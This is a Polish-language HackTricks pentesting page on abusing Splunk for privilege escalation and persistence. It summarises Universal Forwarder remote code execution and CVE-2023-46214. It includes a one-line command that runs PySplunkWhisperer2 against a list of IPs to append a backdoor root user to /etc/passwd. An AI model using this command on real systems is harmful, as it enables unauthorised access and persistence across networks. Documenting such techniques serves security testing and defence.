# Splunk LPE i trwałość

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Jeśli **przeprowadzasz** enumerację maszyny **wewnętrznie** lub **zewnętrznie** i znajdziesz działający **Splunk** (port 8090), jeśli masz **ważne poświadczenia**, możesz **wykorzystać usługę Splunk** do **wykonania powłoki** jako użytkownik uruchamiający Splunk. Jeśli uruchomiony jest jako root, możesz podnieść uprawnienia do roota.

Jeśli już jesteś **rootem i usługa Splunk nie nasłuchuje tylko na localhost**, możesz **ukraść** plik **z hasłami** z usługi Splunk i **łamać** hasła lub **dodać nowe** poświadczenia. I utrzymać trwałość na hoście.

Na pierwszym poniższym obrazie możesz zobaczyć, jak wygląda strona internetowa Splunkd.

## Podsumowanie eksploitacji agenta Splunk Universal Forwarder

Aby uzyskać więcej szczegółów, sprawdź post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Oto tylko streszczenie:

**Przegląd eksploitacji:**
Eksploit ukierunkowany na agenta Splunk Universal Forwarder (UF) umożliwia atakującym posiadającym hasło agenta wykonanie dowolnego kodu na systemach, na których działa agent, co potencjalnie zagraża całej sieci.

**Kluczowe punkty:**
- Agent UF nie sprawdza przychodzących połączeń ani autentyczności kodu, co czyni go podatnym na nieautoryzowane wykonanie kodu.
- Powszechne metody pozyskiwania haseł obejmują ich lokalizację w katalogach sieciowych, udziałach plików lub wewnętrznej dokumentacji.
- Udane wykorzystanie może prowadzić do uzyskania dostępu na poziomie SYSTEMU lub roota na skompromitowanych hostach, wycieku danych i dalszej infiltracji sieci.

**Wykonanie eksploitacji:**
1. Atakujący uzyskuje hasło agenta UF.
2. Wykorzystuje interfejs API Splunka do wysyłania poleceń lub skryptów do agentów.
3. Możliwe działania obejmują ekstrakcję plików, manipulację kontami użytkowników i kompromitację systemu.

**Wpływ:**
- Pełne skompromitowanie sieci z uprawnieniami na poziomie SYSTEMU/roota na każdym hoście.
- Możliwość wyłączenia logowania w celu uniknięcia wykrycia.
- Instalacja tylnych drzwi lub oprogramowania szantażującego.

**Przykładowe polecenie do eksploatacji:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Dostępne publiczne wykorzystania:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Wykorzystywanie zapytań Splunk

**Aby uzyskać więcej szczegółów, sprawdź wpis [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

CVE-2023-46214 pozwalał na przesłanie dowolnego skryptu do **`$SPLUNK_HOME/bin/scripts`** i wyjaśniono, że za pomocą zapytania wyszukiwania **`|runshellscript script_name.sh`** można było **wykonać** przechowywany tam **skrypt**.


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
